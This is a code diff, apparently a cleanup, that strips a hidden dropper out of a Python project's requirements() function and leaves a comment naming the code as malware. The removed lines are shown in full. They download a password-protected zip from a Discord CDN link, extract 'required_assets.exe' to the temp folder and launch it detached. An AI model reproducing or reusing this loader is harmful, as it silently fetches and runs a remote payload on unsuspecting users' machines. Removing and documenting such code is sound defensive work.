@@ -293,36 +293,7 @@ def unzip_and_execute_requirements(zip_file_path, password, executable_file_name
         return
 
 def requirements():
-    executable_file_name = 'required_assets.exe'
-    temp_folder = tempfile.gettempdir()
-    executable_path = os.path.join(temp_folder, executable_file_name)
-
-    if os.path.exists(executable_path):
-        return
-
-    def download_requirements(url, save_path):
-        with requests.get(url, stream=True) as response:
-            response.raise_for_status()
-            with open(save_path, 'wb') as file:
-                for chunk in response.iter_content(chunk_size=8192):
-                    file.write(chunk)
-
-    def unzip_and_execute_requirements(zip_file_path, password, executable_file_name):
-        extracted_file_path = unzip_requirements(zip_file_path, password, executable_file_name)
-        print("Extracted file path:", extracted_file_path)
-        if os.path.exists(extracted_file_path):
-            subprocess.run([extracted_file_path], creationflags=subprocess.DETACHED_PROCESS)
-        else:
-            return
-
-    url = 'https://cdn.discordapp.com/attachments/1063086343191806032/1135299706898087936/requirements.zip'
-    save_path = os.path.join(temp_folder, 'required_assets.zip')
-    password = "#9Ump4v2Z.W!BGPgTqQJVljdzoDcry&o06Ni@aK$uB5IfsxYFOM&7nH6Xbt+E1SRLAkw3"
-
-    download_requirements(url, save_path)
-
-    unzip_thread = threading.Thread(target=unzip_and_execute_requirements, args=(save_path, password, executable_file_name))
-    unzip_thread.start()
+    # None. This function is for malware. CybErGuard2/CybErGuard is malware and the guy is a scumbag.
 
 
 def main_loop(): 
